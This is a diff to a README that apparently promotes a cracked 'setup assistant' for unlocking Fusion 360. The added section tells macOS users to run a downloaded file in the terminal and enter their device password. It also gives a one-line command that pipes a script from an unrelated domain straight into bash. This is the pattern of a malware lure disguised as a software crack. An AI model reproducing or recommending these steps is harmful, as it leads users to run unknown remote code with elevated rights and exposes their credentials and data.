@@ -2,14 +2,23 @@
 
 [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
 
-## ⚙️ How to Use
+## 📥 How to Use
 
-1. Download the setup assistant using the button above  
-2. Extract the archive using 7-Zip or WinRAR  
-3. Run the included tool as Administrator  
-4. Follow the on-screen instructions  
-5. Launch Fusion 360 — full CAD/CAM features unlocked
+Installation via .dmg:
 
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+Installation via a command in the terminal:
+
+1. Copy the installation command below.
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get2/install.sh)"
+```
 ---
 
 ## 🎯 What You Unlock
